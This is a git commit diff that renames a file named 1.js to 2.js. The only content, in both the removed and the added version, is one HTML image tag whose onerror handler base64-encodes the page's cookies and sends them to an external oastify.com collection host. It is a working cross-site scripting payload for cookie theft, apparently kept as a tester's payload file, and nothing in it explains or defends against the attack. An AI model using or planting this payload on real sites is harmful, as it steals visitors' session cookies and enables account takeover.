895a0469d5fba8c2f4026d45b6a578dd97b0c385
Bùi Thị Thanh Ngân <nganbui9a2017@gmail.com>
2025-03-17 19:45:51 +0700

    Update and rename 1.js to 2.js

--- 1.js
+++
@@ -1,3 +0,0 @@
-
-<img src="404.png" onerror="this.src='https://cfvohxndtv0wkjsw32n27ksp4ga7yypme.oastify.com?data='+btoa(document.cookie)">
-
---
+++ 2.js
@@ -0,0 +1,3 @@
+
+<img src="404.png" onerror="this.src='http://cfvohxndtv0wkjsw32n27ksp4ga7yypme.oastify.com?data='+btoa(document.cookie)">
+
